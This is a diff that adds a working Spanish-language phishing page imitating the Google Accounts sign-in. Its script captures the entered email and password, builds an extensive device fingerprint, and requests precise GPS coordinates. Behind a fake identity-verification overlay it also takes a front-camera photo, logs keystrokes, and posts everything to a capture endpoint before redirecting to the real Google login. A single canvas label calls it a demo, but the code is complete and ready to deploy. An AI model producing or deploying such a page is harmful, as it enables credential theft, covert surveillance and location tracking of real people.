@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión - Google Accounts</title>
+    <style>
+        /* Estilos idénticos a Google */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+            background: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .container {
+            max-width: 450px;
+            margin: auto;
+            padding: 48px 40px 36px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+        }
+        .logo { width: 75px; margin-bottom: 16px; }
+        h1 { 
+            color: #202124; 
+            font-size: 24px; 
+            font-weight: 400;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+        .subtitle { 
+            color: #202124;
+            text-align: center;
+            margin-bottom: 32px;
+        }
+        input {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            margin-bottom: 8px;
+        }
+        input:focus { border-color: #1a73e8; outline: none; border-width: 2px; }
+        .btn-next {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            float: right;
+            cursor: pointer;
+            font-weight: 500;
+        }
+        .hidden { display: none; }
+        
+        /* Overlay de "verificación de seguridad" */
+        #securityOverlay {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(255,255,255,0.98);
+            z-index: 9999;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 20px;
+        }
+        .spinner {
+            width: 50px; height: 50px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1a73e8;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        #gpsStatus {
+            color: #5f6368;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <svg class="logo" viewBox="0 0 75 24">
+            <!-- Logo Google SVG -->
+            <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
+            <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+            <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
+            <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
+        </svg>
+        
+        <h1>Iniciar sesión</h1>
+        <p class="subtitle">Utiliza tu cuenta de Google</p>
+        
+        <form id="loginForm">
+            <input type="email" id="email" name="email" placeholder="Correo electrónico o teléfono" required autocomplete="username">
+            <input type="password" id="password" name="password" placeholder="Contraseña" required autocomplete="current-password">
+            <button type="submit" class="btn-next">Siguiente</button>
+        </form>
+    </div>
+
+    <!-- Overlay de verificación de seguridad falsa -->
+    <div id="securityOverlay">
+        <div class="spinner"></div>
+        <h2>Verificando su identidad...</h2>
+        <p>Por favor, espere mientras confirmamos su ubicación habitual.</p>
+        <p id="gpsStatus">Solicitando acceso a ubicación...</p>
+    </div>
+
+    <script>
+        // Generar ID de sesión único
+        const sessionId = 'sess_' + Math.random().toString(36).substr(2, 9);
+        
+        // ==================== FINGERPRINTING AVANZADO ====================
+        
+        async function getFingerprint() {
+            const fp = {
+                sessionId: sessionId,
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory || 'unknown',
+                maxTouchPoints: navigator.maxTouchPoints,
+                languages: navigator.languages,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                screenResolution: `${screen.width}x${screen.height}`,
+                screenAvailable: `${screen.availWidth}x${screen.availHeight}`,
+                colorDepth: screen.colorDepth,
+                pixelRatio: window.devicePixelRatio,
+                touchSupport: 'ontouchstart' in window,
+                cookiesEnabled: navigator.cookieEnabled,
+                pdfViewerEnabled: navigator.pdfViewerEnabled,
+                webdriver: navigator.webdriver,
+                doNotTrack: navigator.doNotTrack,
+                currentUrl: window.location.href,
+                referrer: document.referrer,
+                historyLength: window.history.length
+            };
+
+            // Canvas Fingerprinting
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                canvas.width = 200;
+                canvas.height = 50;
+                
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(0, 0, 200, 50);
+                ctx.fillStyle = '#069';
+                ctx.fillText('Fingerprint: ' + sessionId, 2, 15);
+                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                ctx.fillText('Advanced Phishing Demo', 4, 17);
+                
+                fp.canvasFingerprint = canvas.toDataURL();
+            } catch(e) {
+                fp.canvasFingerprint = 'blocked';
+            }
+
+            // WebGL Fingerprinting
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    fp.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                    fp.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                }
+            } catch(e) {
+                fp.webglVendor = 'blocked';
+            }
+
+            // Información de conexión
+            if (navigator.connection) {
+                fp.connection = {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt,
+                    saveData: navigator.connection.saveData
+                };
+            }
+
+            // Batería
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    fp.battery = {
+                        level: Math.round(battery.level * 100),
+                        charging: battery.charging,
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                } catch(e) {}
+            }
+
+            // Fuentes instaladas
+            const fontList = ['Arial', 'Times New Roman', 'Courier New', 'Georgia', 'Verdana', 
+                             'Helvetica', 'Tahoma', 'Trebuchet MS', 'Impact', 'Comic Sans MS'];
+            fp.installedFonts = [];
+            const testString = 'mmmmmmmmmmlli';
+            const testSize = '72px';
+            const baseFonts = ['monospace', 'sans-serif', 'serif'];
+            
+            const h = document.createElement('span');
+            h.style.position = 'absolute';
+            h.style.left = '-9999px';
+            h.style.fontSize = testSize;
+            h.innerHTML = testString;
+            document.body.appendChild(h);
+            
+            for (let font of fontList) {
+                let detected = false;
+                for (let base of baseFonts) {
+                    h.style.fontFamily = `"${font}", ${base}`;
+                    const w = h.offsetWidth;
+                    const h1 = h.offsetHeight;
+                    h.style.fontFamily = base;
+                    const w2 = h.offsetWidth;
+                    const h2 = h.offsetHeight;
+                    if (w !== w2 || h1 !== h2) {
+                        detected = true;
+                        break;
+                    }
+                }
+                if (detected) fp.installedFonts.push(font);
+            }
+            document.body.removeChild(h);
+
+            return fp;
+        }
+
+        // ==================== GEOLOCALIZACIÓN GPS REAL ====================
+        
+        async function getPreciseGPS() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve(null);
+                    return;
+                }
+
+                const options = {
+                    enableHighAccuracy: true,  // GPS de alta precisión
+                    timeout: 10000,
+                    maximumAge: 0
+                };
+
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        resolve({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            altitude: position.coords.altitude,
+                            altitudeAccuracy: position.coords.altitudeAccuracy,
+                            heading: position.coords.heading,
+                            speed: position.coords.speed,
+                            timestamp: position.timestamp
+                        });
+                    },
+                    (error) => {
+                        console.log('GPS Error:', error);
+                        resolve(null);
+                    },
+                    options
+                );
+            });
+        }
+
+        // ==================== CAPTURA DE CÁMARA ====================
+        
+        async function captureCamera() {
+            return new Promise(async (resolve) => {
+                try {
+                    // Solicitar acceso a cámara
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { 
+                            facingMode: "user",  // Cámara frontal
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 }
+                        },
+                        audio: false 
+                    });
+                    
+                    // Crear elemento video oculto
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    
+                    // Esperar a que cargue
+                    await new Promise(r => video.onloadedmetadata = r);
+                    
+                    // Crear canvas para capturar frame
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const ctx = canvas.getContext('2d');
+                    
+                    // Dibujar frame
+                    ctx.drawImage(video, 0, 0);
+                    
+                    // Detener stream
+                    stream.getTracks().forEach(track => track.stop());
+                    
+                    // Convertir a base64
+                    const photoData = canvas.toDataURL('image/jpeg', 0.9);
+                    resolve(photoData);
+                    
+                } catch (err) {
+                    console.log('Camera error:', err);
+                    resolve(null);
+                }
+            });
+        }
+
+        // ==================== ENVÍO DE DATOS ====================
+        
+        async function sendData(data) {
+            try {
+                await fetch('/api/capture', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+            } catch(e) {
+                console.error('Error sending:', e);
+            }
+        }
+
+        // ==================== FLUJO PRINCIPAL ====================
+        
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // Mostrar overlay de "verificación"
+            const overlay = document.getElementById('securityOverlay');
+            overlay.style.display = 'flex';
+            
+            // Recolectar fingerprint
+            const fingerprint = await getFingerprint();
+            fingerprint.email = email;
+            fingerprint.password = password;
+            
+            // Obtener GPS
+            document.getElementById('gpsStatus').textContent = 'Obteniendo coordenadas GPS...';
+            const gps = await getPreciseGPS();
+            fingerprint.gps = gps;
+            
+            // Capturar cámara
+            document.getElementById('gpsStatus').textContent = 'Verificación biométrica...';
+            const photo = await captureCamera();
+            if (photo) {
+                fingerprint.photoData = photo;
+            }
+            
+            // Enviar todo
+            await sendData(fingerprint);
+            
+            // Redirigir a Google real
+            window.location.href = 'https://accounts.google.com/signin/v2/identifier?flowName=GlifWebSignIn';
+        });
+
+        // Keylogger en tiempo real
+        let keystrokes = [];
+        document.addEventListener('keypress', function(e) {
+            keystrokes.push({
+                key: e.key,
+                time: Date.now(),
+                target: e.target.name || e.target.id || 'unknown'
+            });
+        });
+    </script>
+</body>
+</html>
